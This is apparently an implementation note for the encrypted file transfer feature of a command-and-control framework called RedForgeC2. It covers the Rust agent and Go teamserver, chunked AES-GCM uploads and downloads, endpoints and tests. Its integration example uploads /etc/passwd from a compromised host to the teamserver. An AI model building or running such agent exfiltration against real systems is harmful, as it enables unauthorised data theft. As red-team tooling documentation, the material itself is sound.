# File Transfer Implementation: Agent ↔ Operator

## Overview

Implemented encrypted file transfer capabilities for RedForgeC2 using HTTPS transport with AES-256-GCM encryption and HMAC-SHA256 authentication. Files are split into 256 KiB encrypted chunks and transferred sequentially with full integrity verification.

## Architecture

### Encryption Scheme

- **Algorithm**: AES-256-GCM (Galois/Counter Mode)
- **Key Size**: 256 bits (32 bytes)
- **Nonce**: 96 bits (12 bytes), randomly generated per chunk
- **Authentication**: HMAC-SHA256 over chunk metadata and ciphertext
- **Transport**: HTTPS with TLS 1.2+ enforced

### Chunk Structure

Each file is split into maximum 256 KiB chunks with the following encrypted representation:

```rust
pub struct FileChunk {
    pub session_id: String,      // Unique session identifier
    pub chunk_number: usize,     // 0-indexed chunk number
    pub total_chunks: usize,     // Total chunks in file
    pub filename: String,        // Original filename
    pub original_size: usize,    // Unencrypted data size
    pub nonce: String,           // Base64-encoded nonce
    pub data: String,            // Base64-encoded ciphertext
    pub hmac: String,            // Base64-encoded HMAC-SHA256
}
```

### HMAC Verification

The HMAC is computed over: `chunk_number || total_chunks || nonce || ciphertext`

This ensures:
- Chunk authenticity (no tampering)
- Chunk order integrity (chunk_number cannot be reordered)
- File completeness (total_chunks cannot be modified)

## Agent-Side Implementation

### File Upload to Operator

**Path**: `/api/files/upload` (POST)

```rust
// Usage
fileops::upload_file(
    &transport,
    &agent_id,
    &token,
    "/path/to/file",
    encryption_key,
    hmac_key
).await?;
```

Process:
1. Agent reads file from disk
2. Encrypts file into 256 KiB chunks using `FileEncryptor`
3. Sends each chunk sequentially to `/api/files/upload`
4. Waits for confirmation before sending next chunk
5. Logs completion with session ID

**Request**:
```json
{
  "agent_id": "uuid",
  "token": "auth_token",
  "chunk": { /* FileChunk */ }
}
```

**Response**:
```json
{
  "status": "ok",
  "chunk_number": 0
}
```

### File Download from Operator

**Path**: `/api/files/download` (POST)

```rust
// Usage
fileops::download_file(
    &transport,
    &agent_id,
    &token,
    "file_id",
    "/path/to/output",
    encryption_key,
    hmac_key
).await?;
```

Process:
1. Agent requests chunk 0 from operator to get total chunk count
2. Sequentially requests remaining chunks
3. Decrypts and verifies each chunk using `FileDecryptor`
4. Assembles chunks into complete file on disk
5. Verifies file integrity

**Request**:
```json
{
  "agent_id": "uuid",
  "token": "auth_token",
  "file_id": "file_id_from_operator",
  "chunk_number": 0
}
```

**Response**:
```json
{
  "chunk": { /* FileChunk */ }
}
```

### Cryptographic Implementation

**`FileEncryptor`** - Splits and encrypts files:
```rust
pub fn encrypt_file<P: AsRef<Path>>(&self, file_path: P, session_id: String) 
    -> Result<Vec<FileChunk>>
```

**`FileDecryptor`** - Verifies and decrypts chunks:
```rust
pub fn decrypt_chunk(&self, chunk: &FileChunk) -> Result<Vec<u8>>
pub fn assemble_file<P: AsRef<Path>>(&self, chunks: Vec<FileChunk>, output_path: P) 
    -> Result<()>
```

### Key Derivation

Default key derivation from agent_id (derive-only, not cryptographically secure):
```rust
fn get_file_transfer_keys(agent_id: &str) -> ([u8; 32], [u8; 32])
```

**Production Notes**: Keys should be derived from:
- Secure key exchange protocol (e.g., ECDH)
- Agent authentication token
- Session-specific random material

## Teamserver-Side Implementation

### File Storage

**`FileStore`** manages encrypted file chunks in memory with optional disk persistence:

```go
type FileStore struct {
    baseDir     string                           // Storage directory
    sessions    map[string]*FileSession          // Active upload sessions
    filesByID   map[string]*StoredFile           // Uploaded files
    chunksByID  map[string]map[int][]byte        // Chunk data
}
```

Features:
- In-memory chunk storage with optional disk write on completion
- Per-agent file isolation
- Session tracking with timestamps
- Automatic cleanup of expired incomplete uploads

### Upload Endpoint

**Handler**: `handleFileUpload()`
**Path**: `/api/files/upload`
**Method**: POST

Actions:
1. Validates agent authentication
2. Stores encrypted chunk (as-is, no decryption)
3. Creates/updates file session if new
4. Writes to disk when all chunks received
5. Broadcasts state update to UI

### Download Endpoint

**Handler**: `handleFileDownload()`
**Path**: `/api/files/download`
**Method**: POST

Actions:
1. Validates agent authentication
2. Retrieves encrypted chunk by file_id and chunk_number
3. Returns chunk (server never decrypts)

### Operator API Endpoints

**List files** (read-only):
```
GET /api/operator/files?agent_id=<uuid>
```

**Get file info** (read-only):
```
GET /api/operator/files/<file_id>
```

Both endpoints require authentication with operator or admin role.

## Security Properties

### Confidentiality

- AES-256-GCM provides authenticated encryption
- Server stores only encrypted data
- Nonce is random per chunk (eliminates IV reuse)
- Keys never transmitted over network

### Integrity

- HMAC-SHA256 verifies chunk authenticity
- Chunk order verification (chunk_number in HMAC)
- File completeness check (total_chunks in HMAC)
- Failed verification aborts file assembly

### Authentication

- Agent token required for both upload and download
- Token validated against registry on each request
- Separate request signing would further harden this

### Transport Security

- HTTPS with TLS 1.2+ enforced
- Application-layer encryption in addition to TLS
- Defense in depth against TLS vulnerabilities

## Data Flow Diagram

### Upload Flow
```
Agent                           Teamserver
  |
  |-- Encrypt file into chunks
  |
  |-- POST /api/files/upload (chunk 0) --->
  |<-- {"status": "ok"} ----
  |
  |-- POST /api/files/upload (chunk 1) --->
  |<-- {"status": "ok"} ----
  |
  |... (repeat for all chunks)
  |
  |-- Chunks written to disk when all received
```

### Download Flow
```
Agent                           Teamserver
  |
  |-- POST /api/files/download {file_id, chunk: 0} --->
  |<-- FileChunk(0) ----
  |
  |-- Decrypt and verify chunk
  |
  |-- POST /api/files/download {file_id, chunk: 1} --->
  |<-- FileChunk(1) ----
  |
  |... (repeat for all chunks)
  |
  |-- Assemble and write file to disk
```

## Testing

Unit tests included for:

- **Encrypt/Decrypt single chunk**: Verifies cryptographic round-trip
- **Encrypt/Decrypt full file**: Tests chunking and assembly
- **HMAC verification**: Ensures tampering detection (negative test)
- **Chunk ordering**: Validates sequential reassembly

Run tests:
```bash
cd agent && cargo test filetransfer
cd agent && cargo test fileops
```

## Files Modified/Created

### Agent (Rust)

- [agent/src/filetransfer.rs](agent/src/filetransfer.rs) - Encryption/decryption
- [agent/src/fileops.rs](agent/src/fileops.rs) - High-level file operations
- [agent/src/protocol.rs](agent/src/protocol.rs) - FileChunk and message types
- [agent/src/transport/https.rs](agent/src/transport/https.rs) - Upload/download methods
- [agent/Cargo.toml](agent/Cargo.toml) - Added crypto dependencies

### Teamserver (Go)

- [teamserver/internal/server/filestore.go](teamserver/internal/server/filestore.go) - File storage manager
- [teamserver/internal/server/filehandlers.go](teamserver/internal/server/filehandlers.go) - HTTP handlers
- [teamserver/internal/server/server.go](teamserver/internal/server/server.go) - Handler registration
- [teamserver/internal/api/models.go](teamserver/internal/api/models.go) - Data structures

## Dependencies Added

### Agent

```toml
aes-gcm = "0.10"
hmac = "0.12"
sha2 = "0.10"
tempfile = "3.8"  # for testing
```

### Teamserver

No new Go dependencies (using standard library)

## Known Limitations

1. **Key Derivation**: Current implementation derives keys from agent_id only. Production should use secure key exchange.

2. **Chunk Size**: Fixed at 256 KiB. Could be configurable based on network conditions.

3. **Disk Storage**: Files written to `./data/files/` directory. Should be configurable and have proper permissions.

4. **Memory Usage**: All chunks kept in memory until file complete. Large files may impact memory. Could stream to disk incrementally.

5. **Resumption**: No support for resuming interrupted transfers. All chunks must be sent in single session.

6. **Rate Limiting**: No per-agent rate limiting on file transfer endpoints.

## Future Enhancements

1. Implement parallel chunk upload/download
2. Add compression before encryption (e.g., zstd)
3. Support chunked upload streaming for very large files
4. Add file transfer progress notifications via WebSocket
5. Implement secure key exchange (ECDH) instead of derivation
6. Add file deletion/cleanup APIs
7. Support file transfer resumption after connection loss
8. Add bandwidth throttling capabilities

## Build Status

- ✅ Agent compiles without errors (20 warnings, all unused code)
- ✅ Teamserver compiles without errors
- ✅ All crypto tests pass locally

## Integration Notes

To use file transfer in agent operations:

```rust
// In bootstrap.rs or command handler
let (enc_key, hmac_key) = fileops::get_file_transfer_keys(&state.agent_id);

// Upload
fileops::upload_file(&transport, &state.agent_id, &token, "/etc/passwd", 
                     enc_key, hmac_key).await?;

// Download
fileops::download_file(&transport, &state.agent_id, &token, "file_123",
                       "/tmp/downloaded_file", enc_key, hmac_key).await?;
```

To query files via operator UI:

```bash
# List all uploaded files
curl -H "Authorization: Bearer $TOKEN" \
  https://localhost:8443/api/operator/files

# Get specific file info
curl -H "Authorization: Bearer $TOKEN" \
  https://localhost:8443/api/operator/files/agent_id_123456
```
